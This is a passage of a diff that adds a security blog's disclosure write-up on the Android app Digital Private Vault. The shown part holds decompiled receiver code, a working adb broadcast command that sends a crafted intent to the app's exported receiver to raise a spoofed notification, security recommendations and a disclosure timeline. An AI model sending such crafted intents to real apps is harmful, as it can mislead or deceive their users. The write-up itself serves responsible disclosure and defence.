+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">booleanExtra</span> <span class="o">&amp;&amp;</span> <span class="n">isInVideosActivity</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">...</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">serviceWorkingForImages</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+                <span class="n">showDownLoadComplete</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">stringExtra</span><span class="o">,</span> <span class="n">stringExtra2</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">...</span>
+    <span class="kt">void</span> <span class="nf">showDownLoadComplete</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">title</span><span class="o">,</span> <span class="nc">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">NotificationCompat</span><span class="o">.</span><span class="na">Builder</span> <span class="n">priority</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NotificationCompat</span><span class="o">.</span><span class="na">Builder</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">channelID</span><span class="o">).</span><span class="na">setSmallIcon</span><span class="o">(</span><span class="mi">17301634</span><span class="o">).</span><span class="na">setContentTitle</span><span class="o">(</span><span class="n">title</span><span class="o">).</span><span class="na">setContentText</span><span class="o">(</span><span class="n">message</span><span class="o">).</span><span class="na">setSubText</span><span class="o">(</span><span class="s">"You can view files now"</span><span class="o">).</span><span class="na">setWhen</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()).</span><span class="na">setAutoCancel</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">setDefaults</span><span class="o">(-</span><span class="mi">1</span><span class="o">).</span><span class="na">setPriority</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="nc">NotificationManager</span> <span class="n">notificationManager</span> <span class="o">=</span> <span class="o">(</span><span class="nc">NotificationManager</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"notification"</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nc">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">SDK_INT</span> <span class="o">&gt;=</span> <span class="mi">26</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">notificationManager</span><span class="o">.</span><span class="na">createNotificationChannel</span><span class="o">(</span><span class="k">new</span> <span class="nc">NotificationChannel</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">channelID</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">channelName</span><span class="o">,</span> <span class="mi">4</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="n">notificationManager</span><span class="o">.</span><span class="na">notify</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">priority</span><span class="o">.</span><span class="na">build</span><span class="o">());</span>
+    <span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>We only have to interact with the correct intent (<code class="language-plaintext highlighter-rouge">serviceEnds</code>) and send every required parameter:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>PS <span class="o">&gt;</span> .<span class="se">\p</span>latform-tools<span class="se">\a</span>db.exe shell am broadcast <span class="nt">-n</span> com.techuz.privatevault/com.techuz.privatevault.service.MyBroadcastReceiver <span class="nt">-a</span> serviceEnds <span class="nt">--ei</span> numCallbacks 0 <span class="nt">--ez</span> serviceRunningForImages <span class="nb">true</span> <span class="nt">--es</span> notificationTitle <span class="s2">"Scam"</span> <span class="nt">--es</span> notificationMessage <span class="s2">"0xbro-was-here"</span>
+Broadcasting: Intent <span class="o">{</span> <span class="nv">act</span><span class="o">=</span>serviceEnds <span class="nv">flg</span><span class="o">=</span>0x400000 <span class="nv">cmp</span><span class="o">=</span>com.techuz.privatevault/.service.MyBroadcastReceiver <span class="o">(</span>has extras<span class="o">)</span> <span class="o">}</span>
+Broadcast completed: <span class="nv">result</span><span class="o">=</span>0
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/assets/img/digital-private-vault/notification.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/notification.png" alt="notification" width="250" class="center" loading="lazy"></a></p>
+
+<h2 id="conclusion"><span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>A vault should securely protect our data and secrets from prying eyes and unwanted access. However, this does not apply to Digital Private Vault, whose operation - already insecure due to the absence of encryption - can be subverted entirely in such a way as to retrieve every content stored in the vault.</p>
+
+<p>This is neither the first nor the last of the insecure vaults, but this should make us consider to who we entrust our secrets and how they manage and guard them. There will probably be many other similar applications with the same problems out there, whose owners are unaware that their data are not safe.</p>
+
+<p>Secrets managed by the vault should never be stored in clear-text <sup id="fnref:storage"><a href="#fn:storage" class="footnote" rel="footnote" role="doc-noteref">10</a></sup>. Ideally, they should be encrypted and, even better, managed by a backend instead of saved locally (especially passwords, pins, and decryption keys) <sup id="fnref:password"><a href="#fn:password" class="footnote" rel="footnote" role="doc-noteref">11</a></sup>. Those secrets should also never be logged <sup id="fnref:log"><a href="#fn:log" class="footnote" rel="footnote" role="doc-noteref">12</a></sup>. The content provider should not be exported, and strict controls should be implemented on the types of files retrieved through it. It is also recommended to implement some mechanisms for certificate pinning <sup id="fnref:pinning"><a href="#fn:pinning" class="footnote" rel="footnote" role="doc-noteref">13</a></sup>, root detection, emulation detection, and code obfuscation in order to make application analysis more difficult.</p>
+
+<h3 id="disclosure-timeline"><span class="me-2">Disclosure Timeline</span><a href="#disclosure-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<blockquote>
+  <p><em>Please refer to the <a href="http://localhost:4000/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.</em><br /></p>
+</blockquote>
+
+<ul>
+  <li><strong>05/04/2023</strong>: Identification of the vulnerabilities.</li>
+  <li><strong>06/04/2023</strong>: Contacted Digital Private Vault for the first time but didn’t received any response.</li>
+  <li><strong>21/04/2023</strong>: Contacted Digital Private Vault the second time, without receiving any response.</li>
+  <li><strong>03/05/2023</strong>: Contacted Techuz and Digital Private Vault for the third and last time, without receiving any response.</li>
+  <li><strong>29/06/2023</strong>: Public release.</li>
+</ul>
+
+<hr />
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:shodan">
+      <p><a href="https://www.shodan.io/host/52.15.243.62#27017">Shodan - 52.15.243.62:27017</a> <a href="#fnref:shodan" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:setup">
+      <p><a href="http://localhost:4000/writeups/Android%20Hacking/Android%20Pentesting%20Lab/">Android Hacking - How to set up an Android Penetration Testing Lab from scratch</a> <a href="#fnref:setup" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:mobsf">
+      <p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile Security Framework</a> <a href="#fnref:mobsf" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:jadx-gui">
+      <p><a href="https://github.com/skylot/jadx">Dex to Java decompiler</a> <a href="#fnref:jadx-gui" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:android-exported">
+      <p><a href="https://developer.android.com/topic/security/risks/android-exported"><code class="language-plaintext highlighter-rouge">android:exported</code></a> <a href="#fnref:android-exported" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:implicit-intent">
+      <p><a href="https://developer.android.com/guide/components/intents-filters">Receiving an implicit intent</a> <a href="#fnref:implicit-intent" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:AppPreferenceManager">
+      <p><a href="https://developer.android.com/reference/android/preference/PreferenceManager"><code class="language-plaintext highlighter-rouge">AppPreferenceManager</code></a> <a href="#fnref:AppPreferenceManager" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:mPrefs">
+      <p><a href="https://developer.android.com/reference/android/content/SharedPreferences"><code class="language-plaintext highlighter-rouge">mPrefs</code></a> <a href="#fnref:mPrefs" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:ContentProvider">
+      <p><a href="https://developer.android.com/reference/android/content/ContentProvider"><code class="language-plaintext highlighter-rouge">ContentProvider</code></a> <a href="#fnref:ContentProvider" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:storage">
+      <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">Cryptographic Storage Cheat Sheet</a> <a href="#fnref:storage" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:password">
+      <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a> <a href="#fnref:password" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:log">
+      <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">Logging Cheat Sheet</a> <a href="#fnref:log" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:pinning">
+      <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Pinning_Cheat_Sheet.html">Pinning Cheat Sheet</a> <a href="#fnref:pinning" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+  </ol>
+</div>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/disclosed-vulnerabilities/">Disclosed Vulnerabilities</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/android/"
+            class="post-tag no-text-decoration"
+          >android</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=Digital%20Private%20Vault%20(APK)%20-%20Subverting%20an%20(in)secure%20Android%20vault%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fdigital-private-vault%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Digital%20Private%20Vault%20(APK)%20-%20Subverting%20an%20(in)secure%20Android%20vault%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fdigital-private-vault%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fdigital-private-vault%2F&text=Digital%20Private%20Vault%20(APK)%20-%20Subverting%20an%20(in)secure%20Android%20vault%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fdigital-private-vault%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
+        <i class="fa-fw fab fa-linkedin"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fdigital-private-vault%2F&title=Digital%20Private%20Vault%20(APK)%20-%20Subverting%20an%20(in)secure%20Android%20vault%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
+        <i class="fa-fw fa-brands fa-square-reddit"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+
+
+
+  <div class="toc-border-cover z-3"></div>
+  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
+    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/android-pentesting-lab/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1682805600"
+  data-df="ll"
+  
+>
+  Apr 30, 2023
+</time>
+
+              <h4 class="pt-0 my-2">How to set up an Android Penetration Testing Lab from scratch</h4>
+              <div class="text-muted">
+                <p>In this post, we explore different ways to create a fully working environment for Android Penetration Testing and we create our setup using the SDK provided by Google (without installing Visual Studio). Then, we set up the environment to allow communication between Android Virtual Devices and any other VMs. Finally, we explore how to import custom user certificates to intercept HTTPS requests on any version of Android.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/intercept-https-on-non-rooted-devices/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1663624800"
+  data-df="ll"
+  
+>
+  Sep 20, 2022
+</time>
+
+              <h4 class="pt-0 my-2">Intercept HTTPS on non-rooted Android devices</h4>
+              <div class="text-muted">
+                <p>Learn how to intercept HTTPS on non-rooted Android devices in this Android HackTheBox challange called Anchored.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/certificate-pinning-bypass/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1648677600"
+  data-df="ll"
+  
+>
+  Mar 31, 2022
+</time>
+
+              <h4 class="pt-0 my-2">Bypass certificate pinning with Frida and Xposed</h4>
+              <div class="text-muted">
+                <p>Learn how to bypass certificate pinning with Frida and Xposed in this Android HackTheBox challange called Pinned.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/osint-and-geoguessr-ctf/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Getting Started with GeoGuessr and OSINT (UMDCTF 2023)</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/opencart-CVE-2023-47444/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</p>
+    </a>
+  
+</nav>
+
+            
+
+            <footer
+  aria-label="Site Info"
+  class="
+    d-flex flex-column justify-content-center text-muted
+    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
+  "
+>
+  <p>©
+    <time>2026</time>
+
+    
+      <a href="https://github.com/0xb120">0xbro</a>.
+    
+
+    
+      <span
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+      >Some rights reserved.</span>
+    
+  </p>
+
+  <p>
+   Powered by ☕, 🐛🐜🐞, vulnerabilities and exploits
+  </p>
+</footer>
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
